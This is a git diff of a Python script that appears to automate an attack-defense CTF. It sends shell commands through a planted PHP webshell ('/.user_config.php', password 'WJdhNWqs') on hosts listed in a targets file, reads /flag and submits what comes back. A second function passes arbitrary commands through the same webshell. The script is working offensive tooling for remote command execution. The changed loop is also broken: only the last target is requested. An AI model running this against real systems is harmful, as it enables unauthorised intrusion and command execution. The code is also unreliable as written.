@@ -7,30 +7,28 @@ from core.data import *
 import re
 
 
-def web_run():
-    for i in range(0,len(conf.targets)):
-        getflag(conf.targets[i],conf.ports[i])
-
-
-def getflag(target, port):  #获取flag并自动提交，通过webshell来获取flag
+def getflag():  #获取flag并自动提交，可通过webshell来获取flag
     uri = "/.user_config.php"  #shell地址
     header = {
 		"Content-Type": "application/x-www-form-urlencoded",
 		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
+        "cookie": ""
 	}
     data = "pass=WJdhNWqs&cmd=system('cat /flag');"
-    #data = "cmd=system('cat /flag');"
-    url = target + uri
+    with open('web_targets.txt', 'r') as f:
+        targets = f.readlines()
+        for target in targets:
+            target = target.strip()
+            url = "http://" + target + uri
+        try:
+            res = requests.post(url, headers=header, data=data, timeout=2)
+            #res = requests.get(url, headers=header, timeout=2)
+        except Exception as f:
+            print(url + "\t请求失败\n")
+        submit_flag(res.text)
 
-    try:
-        res = requests.post(url, headers=header, data=data,timeout=1)
-        submit_flag(res)
-    except Exception as f:
-        print(f)
-        print(url + "\tshell未上传成功\n")
 
-
-def webshell():   #获取webshell
+def webshell():   #上传webshell
     uri = "/.user_config.php"
     header = {
         "Content-Type": "application/x-www-form-urlencoded",
@@ -43,7 +41,6 @@ def webshell():   #获取webshell
 
         for target in targets:
             target = target.strip()
-            #data = 'c=system("{}");'.format(poc)
             url = "http://" + target + uri
             print(url)
             data = "pass=WJdhNWqs&cmd=system('{}');".format(poc)
